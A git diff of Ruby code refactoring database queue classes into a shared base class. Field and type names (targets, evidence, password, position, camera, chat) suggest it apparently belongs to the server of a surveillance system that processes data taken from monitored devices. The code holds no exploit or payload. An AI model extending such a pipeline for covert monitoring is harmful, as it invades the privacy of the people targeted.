@@ -3,104 +3,129 @@ require 'mongoid'
 #module RCS
 #module DB
 
-class OCRQueue
-  include Mongoid::Document
+class NotificationQueue
   extend RCS::Tracer
+
+  @@queues = []
 
   QUEUED = 0
   PROCESSED = 1
+
+  def self.add(target_id, evidence_id)
+    trace :debug, "Adding to #{self.name}: #{target_id} #{evidence_id}"
+
+    # insert it in the queue
+    self.create!({target_id: target_id.to_s, evidence_id: evidence_id.to_s})
+  end
+
+  def self.inherited(klass)
+    @@queues << klass
+  end
+
+  def self.create_queues
+    db = RCS::DB::DB.instance.mongo_connection
+    collections = db.collections.map {|c| c.name}
+    # damned mongoid!! it does not support capped collection creation
+    @@queues.each do |k|
+      begin
+        next if collections.include? k.collection.name
+        k.mongo_session.command(create: k.collection.name, capped: true, size: 50_000_000, max: 100_000)
+      rescue Exception => e
+        trace :error, "Cannot create queue #{k.name}: #{e.message}"
+      end
+    end
+  end
+end
+
+class AlertQueue < NotificationQueue
+  include Mongoid::Document
+
+  field :alert, type: Array
+  field :evidence, type: Array
+  field :path, type: Array
+  field :to, type: String
+  field :subject, type: String
+  field :body, type: String
+  field :flag, type: Integer, default: QUEUED
+
+  store_in collection: 'alert_queue'
+
+  # override the inherited method
+  def self.add(params)
+    self.create! do |aq|
+      aq.alert = [params[:alert]._id] if params[:alert]
+      aq.evidence = [params[:evidence]._id] if params[:evidence]
+      aq.path = params[:path]
+      aq.to = params[:to]
+      aq.subject = params[:subject]
+      aq.body = params[:body]
+    end
+  rescue Exception => e
+    trace :error, "Cannot queue alert: #{e.message}"
+    trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
+  end
+end
+
+class OCRQueue < NotificationQueue
+  include Mongoid::Document
 
   field :target_id, type: String
   field :evidence_id, type: String
-  field :flag, type: Integer
+  field :flag, type: Integer, default: QUEUED
 
-  store_in :ocr_queue, capped: true, max: 100_000, size: 50_000_000
-
-  def self.add(target_id, evidence_id)
-    trace :debug, "Adding to OCR queue: #{target_id} #{evidence_id}"
-    OCRQueue.create!({target_id: target_id.to_s, evidence_id: evidence_id.to_s, flag: QUEUED})
-  end
-
+  store_in collection: 'ocr_queue'
 end
 
-class TransQueue
-  include Mongoid::Document
-  extend RCS::Tracer
 
-  QUEUED = 0
-  PROCESSED = 1
+class TransQueue < NotificationQueue
+  include Mongoid::Document
 
   field :target_id, type: String
   field :evidence_id, type: String
-  field :flag, type: Integer
+  field :flag, type: Integer, default: QUEUED
 
-  store_in :trans_queue, capped: true, max: 100_000, size: 50_000_000
-
-  def self.add(target_id, evidence_id)
-    trace :debug, "Adding to TRANSLATE queue: #{target_id} #{evidence_id}"
-    TransQueue.create!({target_id: target_id.to_s, evidence_id: evidence_id.to_s, flag: QUEUED})
-  end
-
+  store_in collection: 'trans_queue'
 end
 
-class AggregatorQueue
-  include Mongoid::Document
-  extend RCS::Tracer
 
-  QUEUED = 0
-  PROCESSED = 1
+class AggregatorQueue < NotificationQueue
+  include Mongoid::Document
+
+  field :target_id, type: String
+  field :evidence_id, type: String
+  field :flag, type: Integer, default: QUEUED
+
+  store_in collection: 'aggregator_queue'
 
   AGGREGATOR_TYPES = ['call', 'message', 'chat']
-
-  field :target_id, type: String
-  field :evidence_id, type: String
-  field :flag, type: Integer
-
-  store_in :aggregator_queue, capped: true, max: 500_000, size: 100_000_000
 
   def self.add(target_id, evidence_id, type)
     # skip not interesting evidence
     return unless AGGREGATOR_TYPES.include? type
 
-    trace :debug, "Adding to AGGREGATOR queue: #{target_id} #{evidence_id}"
-    AggregatorQueue.create!({target_id: target_id.to_s, evidence_id: evidence_id.to_s, flag: QUEUED})
+    super(target_id, evidence_id)
   end
-
 end
 
-class IntelligenceQueue
+class IntelligenceQueue < NotificationQueue
   include Mongoid::Document
-  extend RCS::Tracer
-
-  QUEUED = 0
-  PROCESSED = 1
-
-  INTELLIGENCE_TYPES = ['addressbook', 'password', 'position', 'camera']
 
   field :target_id, type: String
   field :evidence_id, type: String
-  field :flag, type: Integer
+  field :flag, type: Integer, default: QUEUED
 
-  store_in :intelligence_queue, capped: true, max: 500_000, size: 100_000_000
+  store_in collection: 'intelligence_queue'
+
+  INTELLIGENCE_TYPES = ['addressbook', 'password', 'position', 'camera']
 
   def self.add(target_id, evidence_id, type)
     # skip not interesting evidence
     return unless INTELLIGENCE_TYPES.include? type
 
-    # mark the entity as dirty so the module can analyze it to search for new handles
-    if ['addressbook', 'password'].include? type
-      entity = ::Entity.targets.also_in(path: [target_id]).first
-      # recreate the hash to trigger the mongoid save
-      entity[:analyzed] = {'handles' => false, 'handles_last' => entity[:analyzed]['handles_last']}
-      entity.save
-    end
-
-    # perform correlation on these evidence
-    if ['position', 'camera'].include? type
-      trace :debug, "Adding to INTELLIGENCE queue: #{target_id} #{evidence_id}"
-      IntelligenceQueue.create!({target_id: target_id.to_s, evidence_id: evidence_id.to_s, flag: QUEUED})
-    end
+    super(target_id, evidence_id)
   end
+
+
 
 end
 
